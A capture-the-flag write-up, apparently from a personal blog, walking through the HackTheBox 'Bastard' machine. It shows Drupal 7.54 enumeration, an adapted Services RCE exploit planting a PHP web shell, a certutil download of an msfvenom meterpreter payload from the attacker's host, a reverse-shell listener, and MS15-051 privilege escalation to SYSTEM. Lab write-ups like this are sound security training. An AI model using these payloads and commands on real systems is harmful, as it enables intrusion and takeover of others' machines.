---
layout: post
title: HackTheBox - Bastard write-up
---
As usual, I start with quick Nmap scan:
```
nmap -sC -sV 10.10.10.79
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 12:41 EDT
Nmap scan report for 10.10.10.9
Host is up (0.013s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.96 seconds
```
<!--more-->
I see Drupal instance at port 80,
{:refdef: style="text-align: center;"}
![](/images/d913bb42895841038e2673037ec43956.png)
{: refdef}
and I kick off `droopescan`:
```
python ~/bin/droopescan/droopescan scan drupal -u 10.10.10.9
```
Which finds nothing interesting, except the Drupal version:
```
[+] Possible version(s):
    7.54
```
Visiting <a href="http://10.10.10.9/CHANGELOG.txt">http://10.10.10.9/CHANGELOG.txt</a> confirms that the detected version is correct.

Next, I decide to enumerate web directories while looking for potentially useful Drupal exploits: 
```
dirsearch.py -u http://10.10.10.9 -t 32 -r -e -f -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --plain-text-report="/home/k-lazarev/HackTheBox/Bastard/dirsearch-80.txt"
```
Most relevant ExploitDB exploit:
```
Drupal 7.x Module Services - Remote Code Execution	|	php/webapps/41564.php
```
After a close look I notice that in order to work the exploit will require 3 variables. It also looks like the exploit should work with Drupal 7.54: 
```
$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';
```
Luckily, `dirsearch` found REST endpoint:
{:refdef: style="text-align: center;"}
![](/images/be8ada321c604cbbb72f8bb21635c973.png)
{: refdef}
I adapt the exploit code for the current target:
```
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'nothingtoseehere.php',
    'data' => '<?php echo(system($_GET["cmd"])); ?>'
```
and attempt to run it, which results into the error message:
```
PHP Fatal error:  Uncaught Error: Call to undefined function curl_init() in /home/k-lazarev/HackTheBox/Bastard/exploits/41564.php:254
```
To fix the situation I run `sudo apt install php-curl` and execute the exploit once again.
This time the result is remote code execution on the box:
{:refdef: style="text-align: center;"}
![](/images/43010aa7437743e886b229bb6e57abe5.png)
{: refdef}
Good. Let's transfer a reverse shell executable genereted with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=1337 -f exe > shell.exe`<br><br>I start HTTP server with `python -m SimpleHTTPServer 80` on my Kali VM and put `http://10.10.10.9/nothingtoseehere.php?cmd=certutil.exe%20-f%20-urlcache%20-split%20http://10.10.14.13/shell.exe%20shell.exe` into my browser's address bar. After that I set up a `meterpreter` listener:
```
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.14.13
LHOST => 10.10.14.13
msf5 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf5 exploit(multi/handler) > set LPORT 1337
LPORT => 1337
msf5 exploit(multi/handler) > exploit -j
```
and put `http://10.10.10.9/nothingtoseehere.php?cmd=shell.exe` into the browser's address bar.

At this point I have an interactive low-priv shell:
{:refdef: style="text-align: center;"}
![](/images/47452e158d6f4ac6818e4237fcb6e47b.png)
{: refdef}
For privesc I execute `winPEAS.bat`, only to find out that there are no hot fixes installed on Bastard:
```
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46
System Boot Time:          24/8/2020, 6:51:48
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.576 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.594 MB
Virtual Memory: In Use:    501 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

This immidiately points to a kernel exploit. I study `winPEAS.bat` output further,
```
MS15-051 patch is NOT installed! (Vulns: 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
```
and eventually grab an exploit from here: <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip</a>

After running the exploit on the box I get access as `NT AUTHORITY\SYSTEM`:
{:refdef: style="text-align: center;"}
![](/images/75ebdfbcca684015aafa5acc1ff16287.png)
{: refdef}
